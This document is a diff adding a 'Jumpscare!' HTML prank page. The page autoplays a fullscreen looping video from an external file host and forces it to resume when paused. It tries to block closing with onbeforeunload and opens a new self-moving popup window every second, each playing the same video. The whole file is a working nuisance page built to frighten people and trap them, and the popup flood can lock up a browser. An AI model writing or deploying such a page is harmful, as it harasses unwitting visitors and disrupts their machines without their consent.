@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Jumpscare!</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      background: black;
+      font-family: sans-serif;
+    }
+
+    #videoContainer {
+      display: block;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: black;
+      z-index: 9999;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="videoContainer">
+    <video id="mainVideo" autoplay></video>
+  </div>
+
+  <script>
+    function openPopupWindowMoving() {
+      const popup = window.open("", "", "width=400,height=300,left=200,top=200");
+
+      if (!popup) return;
+
+      popup.document.write(`
+        <body style="margin:0; background:black; overflow:hidden;">
+          <video id="vid" autoplay loop muted style="width:100vw;height:100vh;object-fit:cover;"></video>
+          <script>
+            const v = document.getElementById('vid');
+            v.src = "https://files.catbox.moe/i4bv04.mp4";
+            v.controls = false;
+            v.onpause = () => v.play();
+            setInterval(() => v.play(), 300);
+            window.onbeforeunload = () => false;
+
+            // simulate bouncing
+            let x = 100, y = 100, dx = 4, dy = 4;
+            function move() {
+              window.moveTo(x, y);
+              if (x <= 0 || x + 400 >= screen.width) dx *= -1;
+              if (y <= 0 || y + 300 >= screen.height) dy *= -1;
+              x += dx;
+              y += dy;
+              setTimeout(move, 20);
+            }
+            move();
+          <\/script>
+        </body>
+      `);
+    }
+
+    const container = document.getElementById('videoContainer');
+    const video = document.getElementById('mainVideo');
+
+    video.src = "https://files.catbox.moe/i4bv04.mp4";
+    container.style.display = 'block';
+    video.play();
+    video.controls = false;
+    video.loop = true;
+    video.onpause = () => video.play();
+    setInterval(() => video.play(), 500);
+    window.onbeforeunload = () => false;
+
+    if (container.requestFullscreen) container.requestFullscreen();
+
+    setInterval(() => {
+      openPopupWindowMoving();
+    }, 1000); // 1 sekunda - co sekundę nowe okienko
+  </script>
+
+</body>
+</html>
